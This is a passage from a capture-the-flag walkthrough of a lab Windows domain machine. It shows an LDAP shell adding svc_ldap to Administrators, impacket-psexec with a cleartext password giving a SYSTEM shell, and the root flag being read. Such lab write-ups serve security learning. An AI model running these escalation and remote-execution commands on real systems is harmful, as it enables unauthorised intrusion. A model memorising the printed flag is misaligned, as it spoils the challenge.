 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.
```
```
 # add_user_to_group svc_ldap Administrators ←
Adding user: svc_ldap to group Administrators result: OK ←
```

`impacket-psexec 'svc_ldap:lDaP_1n_th3_cle4r!@10.10.11.222'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.222.....
[*] Found writable share ADMIN$ ←
[*] Uploading file RAnIcqdG.exe
[*] Opening SVCManager on 10.10.11.222.....
[*] Creating service okRP on 10.10.11.222.....
[*] Starting service okRP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: svc_ldap](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_ldap-64b5f6?logo=windows11&logoColor=white)

`net user svc_ldap`:
```
User name                    svc_ldap ←
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/10/2022 8:29:33 PM
Password expires             Never
Password changeable          8/11/2022 8:29:33 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/6/2024 6:57:48 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use ←
Global Group memberships     *Domain Users         
The command completed successfully.
```

</🔄 Alternative Step>

</🔄 Alternative Step>

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is DF65-3903

 Directory of C:\Users\Administrator\Desktop

07/12/2023  12:21 PM    <DIR>          .
07/12/2023  12:21 PM    <DIR>          ..
11/06/2024  04:39 PM                34 root.txt ←
               1 File(s)             34 bytes
               2 Dir(s)   6,117,765,120 bytes free
```

`type root.txt`:
```
e8226de5f5e68cfc62666f4a87271af2

5b01d*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
